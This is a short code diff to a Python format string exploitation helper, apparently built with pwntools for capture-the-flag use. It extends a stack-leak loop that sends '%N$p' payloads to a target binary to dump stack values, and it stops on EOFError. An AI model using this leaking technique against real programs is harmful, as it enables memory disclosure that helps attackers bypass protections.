@@ -15,7 +15,9 @@ class FMT:
 
     def stack_leak(self):
         hex_vals = []
-        for i in range(20):
+
+        # TODO: Variable length
+        for i in range(1000000000):
             p = process(self.filename)
             p.sendline(b"%" + str(i).encode("utf-8") + b"$p")
             try:
@@ -25,6 +27,8 @@ class FMT:
                         hex_vals.append(string.decode('utf-8'))
             except UnicodeDecodeError as e:
                 next
+            except EOFError:
+                break
             p.close()
         
         vals = ''.join(hex_vals)
